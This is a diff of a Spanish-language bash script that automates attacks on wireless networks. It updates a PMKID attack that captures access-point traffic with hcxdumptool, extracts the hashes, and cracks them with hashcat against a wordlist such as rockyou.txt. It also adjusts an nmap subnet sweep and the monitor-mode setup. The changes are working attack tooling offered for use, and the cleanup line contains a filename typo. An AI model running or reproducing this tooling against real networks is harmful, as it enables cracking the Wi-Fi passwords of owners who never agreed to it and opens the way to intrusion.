@@ -103,13 +103,14 @@ pkmid_ataque() {
 	echo -e "${blueColour}[!] Recomendacion: 600 segundos (10 minutos)"
 	read -p "[?] Cuantos segundos quieres que dure la captura de los paquetes?: " seg
 	$cleancolor
-	xterm -hold -e "hcxdumptool -i ${tar}mon -o HashPKMID.pcapng --active_beacon --enable_status=15" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
-	hcxcaptool_PID=$!
-	sleep ${seg}; kill -9 $hcxcaptool_PID; wait $hcxcaptool_PID 2>/dev/null
-    echo -e "\n${redColour} [%] Capturando Hashes\n"
-	sleep 2
+	xterm -hold -e "hcxdumptool -i ${tar}mon --enable_status=1 -o Captura" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
+	hcxdumptool_PID=$!
+	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
+    echo -e "\n${redColour}[%] Capturando Hashes\n"
+	hcxcaptool -z HASHPMKID Captura; sudo rm Capruta 2>/dev/null
+	sleep 1
 	$cleancolor
-	test -f HashPKMID*
+	test -f HASHPMKID*
 	if [ "$(echo $?)" -eq 0 ]; then
 		echo -e "\n${yellowColour}[*] Iniciando ataque de fuerza bruta"
 		sleep 1
@@ -117,11 +118,10 @@ pkmid_ataque() {
 		echo -e "\n${blueColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
 		read -p "[?] Ruta del Diccionario al usar: " dicc1
 		tput civis; echo -e "\n${yellowColour}[*] Preparando el paquete para hacer fuerza bruta..."
-		hcxpcapngtool -o HPKMID.hc22000 -E essidlist HashPKMID.pcapng > /dev/null 2>&1
-		hashcat -m 22000 $dicc1 HPKMID.hc22000 -d 1 --force
+		hashcat -m 16800 $dicc1 HASHPMKID -d 1 --force
 	else 
-	echo -e "\n${redColour}[!] No se pudo capturar el paquete necesario"
-	exit
+		echo -e "\n${redColour}[!] No se pudo capturar el paquete necesario"
+		exit
 	fi
 }
 # 3) ataque
@@ -221,10 +221,11 @@ scanner() {
 	ifconfig $tar up > /dev/null 2>&1
 	sleep 10
 	read -p "[?] Cual es tu subred? (Ejemplo: 192.168.1): " ipnmap
-	echo -e "\n---------------------------------------------------\n"
+	tput civis; echo -e "\n---------------------------------------------------\n"
 	nmap -sP -Pn ${ipnmap}.0/24 | grep '(' | sed 's/^.*for //' | sed 's/Nmap.*//' | sed '1,2d'
 	echo -e "\n---------------------------------------------------"
-	read -p "Enter para salir: "
+	read -p "Enter para salir"
+	tput cnorm
 }
 menunomon() {
 	clear; echo -e "${yellowColour}\n1) Menu fuerza bruta"
@@ -269,8 +270,9 @@ else
 	read -p "[+] Enter para continuar"
 	$cleancolor
 	tput cnorm
-	read -p "[?] Quieres poner en modo monitor tu targeta de red? [Y/N]: " mon
 	echo -e "\n${grayColour}[*] Recomendable y necesario para algunos ataques"
+	read -p "[?] Quieres poner en modo monitor tu targeta de red? [Y/N]: " mon
+	$cleancolor
 		if [ "$mon" == "Y" ] || [ "$mon" == "y" ]; then 
 			iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
 			read -p "[?] Que tarjeta deseas usar: " tar
